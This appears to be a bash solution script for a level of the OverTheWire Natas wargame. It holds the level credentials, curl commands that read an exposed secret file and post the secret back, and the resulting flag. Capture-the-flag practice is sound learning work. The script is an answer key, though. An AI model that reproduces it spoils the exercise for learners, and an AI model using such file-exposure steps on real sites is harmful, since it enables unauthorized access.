#!/bin/bash

 Username="natas6"
 Password="0RoJwHdSKWFTYR5WuiAewauSuNaBXned"

# URL:
 curl -s -u $Username:$Password http://natas6.natas.labs.overthewire.org

# Code:
## find the secret
# curl -s -u $Username:$Password http://natas6.natas.labs.overthewire.org/secret.php

## send a post request with the secret
# curl -s -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" -u $Username:$Password http://natas6.natas.labs.overthewire.org/

# Flag:
# bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
